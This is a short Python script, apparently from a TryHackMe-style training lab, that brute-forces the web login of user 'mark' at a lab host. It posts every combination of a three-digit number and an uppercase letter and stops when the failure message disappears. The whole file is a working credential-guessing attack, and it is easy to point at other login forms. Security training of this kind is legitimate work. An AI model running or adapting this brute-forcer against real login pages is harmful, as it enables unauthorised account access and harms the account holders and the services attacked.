from requests import Session
import string

url = 'http://python.thm/labs/lab1/'
session = Session()
username = 'mark'

def brute_force_mark(length_of_pin, number_of_alphabets):
    letter = string.ascii_uppercase
    for i in range(1000):
        for alpha in letter:
            password = str(i).zfill(length_of_pin)
            password += alpha
            print(f'Trying password {password}')
            data = {"username": username, "password": password}
            response = session.post(url=url,data=data)
            if 'Please try again.' not in response.text:
                print(f"Password found: {username}:{password}")
                return

brute_force_mark(3,1)
